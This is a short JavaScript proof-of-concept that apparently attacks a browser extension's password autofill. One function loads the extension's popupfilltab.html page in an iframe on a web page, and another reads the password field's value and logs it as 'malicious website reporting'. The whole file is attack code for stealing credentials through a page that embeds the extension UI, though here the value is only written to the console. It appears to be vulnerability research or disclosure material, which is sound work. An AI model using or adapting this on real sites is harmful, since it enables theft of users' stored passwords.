function attack() {
    var password = document.getElementById("password").value;
    console.log("malicious website reporting");
    console.log(password);
}

function run() {
    var iframe = document.createElement("iframe");
    iframe.height = "10%";
    iframe.width = "100%";
    iframe.src = "chrome-extension://omkamdlakallckdjjcnglonboddelkmj/popupfilltab.html";
    document.body.appendChild(iframe);
}